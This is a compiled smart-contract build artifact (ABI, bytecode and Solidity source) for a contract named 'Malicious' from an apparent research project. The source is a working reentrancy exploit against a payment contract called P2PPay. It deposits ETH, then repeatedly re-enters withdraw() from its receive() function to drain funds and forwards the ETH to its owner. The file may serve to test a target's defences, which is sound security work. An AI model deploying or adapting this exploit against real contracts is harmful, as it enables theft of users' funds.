{
  "contractName": "Malicious",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "loopCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "reenter",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IP2PPay",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    },
    {
      "inputs": [],
      "name": "depositToTarget",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackWithdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610a76380380610a768339818101604052810190610032919061011c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b61091e806101586000396000f3fe6080604052600436106100595760003560e01c806364bf5dcb14610254578063734088951461025e5780638da5cb5b14610275578063a0fe97e3146102a0578063d4b83992146102cb578063e91675b8146102f65761024f565b3661024f57600160149054906101000a900460ff161561024d5760026000815480929190610086906105c5565b919050555060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016100e7919061064e565b602060405180830381865afa158015610104573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610128919061069a565b905060008111801561013c5750600a600254105b156101c65760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101a957600080fd5b505af11580156101bd573d6000803e3d6000fd5b5050505061024b565b6000600160146101000a81548160ff021916908315150217905550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610249573d6000803e3d6000fd5b505b505b005b600080fd5b61025c610321565b005b34801561026a57600080fd5b50610273610485565b005b34801561028157600080fd5b5061028a610529565b604051610297919061064e565b60405180910390f35b3480156102ac57600080fd5b506102b561054f565b6040516102c291906106e2565b60405180910390f35b3480156102d757600080fd5b506102e0610562565b6040516102ed919061075c565b60405180910390f35b34801561030257600080fd5b5061030b610586565b6040516103189190610786565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1634306000801b6040516024016103729291906107ba565b6040516020818303038152906040527ff4e62465000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516103fc9190610854565b60006040518083038185875af1925050503d8060008114610439576040519150601f19603f3d011682016040523d82523d6000602084013e61043e565b606091505b5050905080610482576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610479906108c8565b60405180910390fd5b50565b60018060146101000a81548160ff021916908315150217905550600060028190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160149054906101000a900460ff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006105d0826105bb565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036106025761060161058c565b5b600182019050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006106388261060d565b9050919050565b6106488161062d565b82525050565b6000602082019050610663600083018461063f565b92915050565b600080fd5b610677816105bb565b811461068257600080fd5b50565b6000815190506106948161066e565b92915050565b6000602082840312156106b0576106af610669565b5b60006106be84828501610685565b91505092915050565b60008115159050919050565b6106dc816106c7565b82525050565b60006020820190506106f760008301846106d3565b92915050565b6000819050919050565b600061072261071d6107188461060d565b6106fd565b61060d565b9050919050565b600061073482610707565b9050919050565b600061074682610729565b9050919050565b6107568161073b565b82525050565b6000602082019050610771600083018461074d565b92915050565b610780816105bb565b82525050565b600060208201905061079b6000830184610777565b92915050565b6000819050919050565b6107b4816107a1565b82525050565b60006040820190506107cf600083018561063f565b6107dc60208301846107ab565b9392505050565b600081519050919050565b600081905092915050565b60005b838110156108175780820151818401526020810190506107fc565b60008484015250505050565b600061082e826107e3565b61083881856107ee565b93506108488185602086016107f9565b80840191505092915050565b60006108608284610823565b915081905092915050565b600082825260208201905092915050565b7f6465706f736974206661696c6564000000000000000000000000000000000000600082015250565b60006108b2600e8361086b565b91506108bd8261087c565b602082019050919050565b600060208201905081810360008301526108e1816108a5565b905091905056fea2646970667358221220c87bff1f7f677fc925a2290b10264418c461d25c13488c99c6ddac0bb780194764736f6c63430008110033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.17;\r\n\r\ninterface IP2PPay {\r\n    function withdraw() external;\r\n    function balanceOf(address who) external view returns (uint256);\r\n}\r\n\r\ncontract Malicious {\r\n    IP2PPay public target;\r\n    address public owner;\r\n    bool public reenter;\r\n    uint256 public loopCount;\r\n\r\n    constructor(address _target) {\r\n        target = IP2PPay(_target);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Deposit helper - send ETH to P2PPay as payee = this contract\r\n    function depositToTarget() external payable {\r\n        // Note: call payTo on target with this contract as the payee\r\n        (bool ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature(\"payTo(address,bytes32)\", address(this), bytes32(0)));\r\n        require(ok, \"deposit failed\");\r\n    }\r\n\r\n    // Start attack: call withdraw() on target; fallback will attempt reentry\r\n    function attackWithdraw() external {\r\n        reenter = true;\r\n        loopCount = 0;\r\n        target.withdraw();\r\n    }\r\n\r\n    receive() external payable {\r\n        if (reenter) {\r\n            loopCount++;\r\n            // If target still has a balance for this contract, reenter\r\n            uint256 bal = target.balanceOf(address(this));\r\n            if (bal > 0 && loopCount < 10) {\r\n                // Attempt to reenter\r\n                target.withdraw();\r\n            } else {\r\n                reenter = false;\r\n                // forward to owner\r\n                payable(owner).transfer(address(this).balance);\r\n            }\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\Jonas\\OneDrive\\Escritorio\\Proyecto de inv OP\\contracts\\Malicious.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-12-15T04:51:33.847Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}